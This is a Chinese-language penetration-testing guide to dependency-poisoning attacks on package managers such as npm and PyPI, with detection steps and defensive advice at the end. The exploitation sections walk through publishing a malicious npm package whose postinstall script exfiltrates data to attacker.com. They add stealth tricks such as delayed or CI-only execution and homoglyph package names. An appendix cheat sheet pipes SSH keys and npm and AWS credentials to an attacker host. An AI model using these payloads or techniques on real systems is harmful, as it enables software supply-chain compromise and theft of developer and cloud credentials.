# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的依赖投毒（Dependency Poisoning）攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用软件供应链中的依赖包安全问题，包括依赖混淆、Typosquatting、恶意包注入等攻击技术。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 npm、PyPI、Maven、NuGet、Gem、Composer 等包管理器的应用
- 自动化构建和部署系统
- CI/CD 管道中依赖下载和安装流程
- 私有仓库与公共仓库混合使用的企业环境

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行代码审计的安全分析师
- 负责供应链安全评估的顾问
- 开发团队中负责依赖管理的技术人员

---

# 第二部分：核心渗透技术专题

## 专题一：依赖投毒攻击

### 2.1 技术介绍

依赖投毒（Dependency Poisoning）是一种软件供应链攻击，攻击者通过向公共包仓库发布恶意包，或滥用包管理器的依赖解析机制，使目标应用在安装依赖时获取并执行恶意代码。

**攻击原理：**
- **依赖混淆（Dependency Confusion）：** 当包管理器优先从公共仓库下载与内部包同名的包时，攻击者可以注册相同的包名并发布恶意版本
- **Typosquatting（包名混淆）：** 利用开发者拼写错误，注册与常用包名相似的恶意包（如 `reqeusts` vs `requests`）
- **恶意版本注入：** 在合法包的更新中植入恶意代码
- **传递依赖投毒：** 攻击深层依赖，影响所有依赖该包的下游项目

**本质：** 应用信任了不可信来源的代码，且缺乏完整性验证机制（如签名验证、哈希校验）。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **Node.js 项目** | 使用 npm/yarn 安装依赖 | 公共 npm 仓库与私有仓库同名包冲突 |
| **Python 项目** | 使用 pip 安装依赖 | PyPI 包名与内部包名冲突 |
| **Java 项目** | Maven/Gradle 依赖管理 | 私有 Nexus 仓库配置不当 |
| **.NET 项目** | NuGet 包管理 | 内部包名在公共 NuGet 被注册 |
| **Ruby 项目** | Gem 包管理 | RubyGems 源配置问题 |
| **PHP 项目** | Composer 依赖管理 | Packagist 源信任问题 |
| **自动化构建** | CI/CD 自动安装依赖 | 无锁文件（lock file）或锁文件被绕过 |
| **容器构建** | Docker 镜像构建时安装依赖 | 构建缓存污染或依赖源被篡改 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**信息收集阶段：**

1. **识别包管理器和依赖源**
   ```bash
   # 检查项目配置文件
   package.json          # npm
   requirements.txt      # pip
   pom.xml               # Maven
   packages.config       # NuGet
   Gemfile               # Bundler
   composer.json         # Composer
   ```

2. **分析依赖结构**
   ```bash
   # npm
   npm list --depth=0
   
   # pip
   pip freeze
   
   # Maven
   mvn dependency:tree
   ```

3. **检查锁文件是否存在**
   ```bash
   # 检查锁文件
   ls -la package-lock.json yarn.lock
   ls -la requirements.txt Pipfile.lock
   ls -la pom.xml
   ```

**依赖混淆检测：**

4. **识别内部包名模式**
   - 查找作用域包（如 `@company/package`）
   - 查找带有企业前缀的包名
   - 分析 `.npmrc`、`pip.conf` 等配置文件中的私有源

5. **测试公共仓库包名占用情况**
   ```bash
   # 检查 npm 包名是否可用
   npm view <package-name> 2>/dev/null || echo "包名可用"
   
   # 检查 PyPI 包名是否可用
   curl -s https://pypi.org/pypi/<package-name>/json | jq '.info' || echo "包名可用"
   ```

#### 2.3.2 白盒测试

**代码审计：**

1. **检查依赖配置文件**
   - 审查 `package.json`、`requirements.txt` 等文件中的依赖版本是否固定
   - 检查是否使用 `*` 或 `latest` 等模糊版本

2. **审计私有源配置**
   ```bash
   # npm 配置
   cat .npmrc
   
   # pip 配置
   cat pip.conf
   cat ~/.config/pip/pip.conf
   ```

3. **检查 CI/CD 配置文件**
   - 审查 `.github/workflows/`、`.gitlab-ci.yml`、`Jenkinsfile`
   - 查找依赖安装命令和源配置

### 2.4 漏洞利用方法

#### 2.4.1 依赖混淆攻击

**步骤 1：识别目标内部包名**

通过以下方式获取内部包名：
- 源码泄露或公开仓库
- 错误配置的 npm registry 响应
- 社会工程学

**步骤 2：在公共仓库发布恶意包**

```bash
# 创建恶意 npm 包
mkdir malicious-pkg
cd malicious-pkg
npm init -y

# 修改 package.json
cat > package.json << EOF
{
  "name": "target-internal-package",
  "version": "99.99.99",
  "description": "Malicious package",
  "main": "index.js",
  "scripts": {
    "postinstall": "node exploit.js"
  }
}
EOF

# 创建恶意脚本
cat > exploit.js << EOF
const { exec } = require('child_process');
exec('curl http://attacker.com/exfil?data=' + process.env.HOSTNAME);
EOF

# 发布到公共仓库
npm publish
```

**步骤 3：等待目标安装**

当目标运行 `npm install` 时，如果公共源优先级高于私有源，恶意包将被安装并执行 `postinstall` 脚本。

#### 2.4.2 Typosquatting 攻击

**常见拼写错误包名示例：**

| 目标包 | 恶意包名变体 |
|-------|------------|
| `requests` | `reqeusts`, `requets`, `requestss` |
| `lodash` | `lodahs`, `loda-sh`, `1odash` |
| `express` | `expres`, `expresss`, `exress` |
| `react` | `reacct`, `reaact`, `reactjs` |
| `axios` | `axois`, `aixos`, `axiox` |

**利用方式：**
```bash
# 发布 Typosquatting 包
npm init -y
# 修改 name 为 "reqeusts"
npm publish
```

#### 2.4.3 传递依赖投毒

**攻击流程：**

1. 识别目标项目使用的流行包
2. 提交该包的 PR，在依赖中添加恶意包
3. 如果 PR 被合并，所有使用该包的项目都将受到影响

#### 2.4.4 信息收集命令

```bash
# 收集系统信息
whoami
hostname
uname -a

# 收集环境变量
env
printenv

# 收集凭证
cat ~/.npmrc
cat ~/.ssh/id_rsa
cat ~/.aws/credentials

# 网络探测
ifconfig
ip addr
netstat -an
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过锁文件保护

**方法 1：针对无锁文件的项目**
- 直接发布更高版本的恶意包
- 利用语义化版本规则（如 `^1.0.0` 会安装最新的 1.x.x 版本）

**方法 2：绕过现有锁文件**
- 等待锁文件过期（依赖包更新时）
- 利用 `npm install --force` 或 `pip install --upgrade` 等命令

#### 2.5.2 绕过包名检测

**方法 1：使用相似字符**
- 使用 Unicode 同形字符（Homoglyph）
- 例如：`аdmin`（使用西里尔字母 а）vs `admin`

**方法 2：利用作用域包**
```json
{
  "name": "@internal/package",
  "version": "1.0.0"
}
```

#### 2.5.3 隐蔽恶意行为

**延迟执行：**
```javascript
// 在安装后延迟执行恶意代码
setTimeout(() => {
  // 恶意代码
}, 3600000); // 1 小时后执行
```

**条件触发：**
```javascript
// 只在特定条件下执行
if (process.env.CI === 'true' || process.env.BUILD_NUMBER) {
  // 仅在 CI/CD 环境中执行
}
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **postinstall 脚本** | npm | `"postinstall": "node exploit.js"` | 安装后自动执行 |
| **信息收集** | Linux | `curl http://attacker.com/$(whoami)` | 外带用户名 |
| **信息收集** | Windows | `powershell -c iwr http://attacker.com/?d=$env:USERNAME` | 外带用户名 |
| **凭证窃取** | npm | `cat ~/.npmrc \| curl -X POST -d @- http://attacker.com` | 窃取 npm 凭证 |
| **凭证窃取** | AWS | `cat ~/.aws/credentials \| curl -X POST -d @- http://attacker.com` | 窃取 AWS 凭证 |
| **SSH 密钥窃取** | 通用 | `tar czf - ~/.ssh \| curl -X POST -T - http://attacker.com` | 窃取 SSH 密钥 |

## 3.2 包管理器优先级配置参考

### npm 优先级

默认情况下，npm 按照以下顺序查找包：
1. 本地 `node_modules`
2. 父目录的 `node_modules`（递归）
3. 配置的 registry（默认 https://registry.npmjs.org）

**优先级配置示例（.npmrc）：**
```ini
registry=https://private-registry.company.com/
@internal:registry=https://private-registry.company.com/
//private-registry.company.com/:_authToken=${NPM_TOKEN}
```

### pip 优先级

**优先级配置示例（pip.conf）：**
```ini
[global]
index-url = https://private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
trusted-host = private-pypi.company.com
```

### Maven 优先级

**settings.xml 配置：**
```xml
<mirrors>
  <mirror>
    <id>private</id>
    <mirrorOf>*</mirrorOf>
    <url>https://nexus.company.com/repository/maven-public/</url>
  </mirror>
</mirrors>
```

## 3.3 防御建议

1. **使用锁文件**：始终提交 `package-lock.json`、`yarn.lock`、`Pipfile.lock` 等
2. **配置私有源优先级**：确保内部包优先从私有源下载
3. **启用包签名验证**：使用 npm audit、pip-audit 等工具
4. **定期审计依赖**：使用 `npm audit`、`snyk test`、`dependabot`
5. **限制 postinstall 脚本**：使用 `--ignore-scripts` 选项
6. **监控公共仓库**：定期检查内部包名是否被注册
